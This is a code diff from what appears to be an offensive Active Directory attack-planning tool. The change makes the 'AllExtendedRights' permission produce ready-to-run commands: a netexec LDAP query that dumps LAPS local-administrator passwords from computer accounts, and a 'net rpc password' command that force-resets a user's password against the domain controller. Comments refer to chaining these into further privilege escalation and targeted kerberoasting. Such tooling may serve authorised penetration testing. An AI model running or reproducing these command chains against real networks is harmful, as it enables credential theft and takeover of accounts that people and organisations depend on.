@@ -1434,16 +1434,34 @@ def run(report, store, ui=None):
                         f"# then chain to R-WRITEDACL / R-SHADOW / R-RBCD",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AllExtendedRights":
-                # iter-51: AllExtendedRights = includes User-Force-Change-Pw
-                # + Read-GMSA-Pw + Read-LAPS-Pw. Route to ForceChange.
-                chains.append(Chain("R-WRITEDACL",
-                    "AllExtendedRights -> ForceChangePassword",
-                    f"AllExtendedRights: {actor} -> {tgt}",
-                    crit=7, conf=0.8, ready=1.4, prox=0.85,       # score 6.66
-                    commands=[
-                        f"net rpc password '{tgt}' '<NewP@ss123!>' "
-                        f"{_net_rpc_U} -S {_dc_e}",
-                    ], src=edge["src"], line=edge["line"]))
+                # iter-51: AllExtendedRights = superset that includes
+                # User-Force-Change-Pw + Read-GMSA-Pw + Read-LAPS-Pw.
+                # iter-122: route on target_kind. Against a computer, LAPS
+                # read is the actual useful primitive (net rpc password on a
+                # HOST$ account errors out). Against a user, ForceChange.
+                # gMSA read isn't routed here because BloodHound labels those
+                # as 'user' target_kind - the operator sees R-GMSA-READ from
+                # the specific ReadGMSAPassword edge when it's set.
+                _aer_computer = (edge.get("target_kind") == "computers"
+                                 or tgt.endswith("$"))
+                if _aer_computer:
+                    chains.append(Chain("R-LAPS-READ",
+                        "AllExtendedRights -> ReadLAPSPassword",
+                        f"AllExtendedRights: {actor} -> {tgt} (LAPS)",
+                        crit=8, conf=0.85, ready=1.5, prox=0.9,    # score 9.18
+                        commands=[
+                            f"netexec ldap {_dc_e} -u '{_owned}' "
+                            f"{_netexec_auth} --laps  # filter to {tgt}",
+                        ], src=edge["src"], line=edge["line"]))
+                else:
+                    chains.append(Chain("R-WRITEDACL",
+                        "AllExtendedRights -> ForceChangePassword",
+                        f"AllExtendedRights: {actor} -> {tgt}",
+                        crit=7, conf=0.8, ready=1.4, prox=0.85,    # score 6.66
+                        commands=[
+                            f"net rpc password '{tgt}' '<NewP@ss123!>' "
+                            f"{_net_rpc_U} -S {_dc_e}",
+                        ], src=edge["src"], line=edge["line"]))
             elif r == "WriteSPN":
                 # iter-41: targeted kerberoast. WriteSPN lets us set an SPN
                 # on any user (that itself has no SPN today), then request
